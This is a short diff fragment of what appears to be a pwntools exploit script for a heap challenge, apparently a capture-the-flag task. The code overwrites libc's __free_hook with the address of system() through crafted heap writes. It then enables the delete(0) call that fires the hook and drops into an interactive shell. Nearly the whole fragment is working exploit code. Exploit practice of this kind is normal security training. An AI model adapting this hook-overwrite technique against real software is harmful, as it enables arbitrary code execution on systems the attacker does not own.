@@ -61,13 +61,12 @@ def main():
 
     merge(1, 1) # 3
 
-    # -0x69 -> write -0x59
     return_2hook = libc.symbols['__free_hook'] - 0x69
     update(3, 0x200 - 0x10, p64(return_2hook) + "D" * (0x200-0x10-8))
     insert(0x200-0x10, "E" * (0x200-0x10)) # 1
     insert(0x200-0x10, "\x00" * 0x59 + p64(libc.symbols['system']) + "\x00" * (0x200-0x10-0x59-8))
     #gdb.attach(r)
-    #delete(0)
+    delete(0)
     r.interactive()
 
 
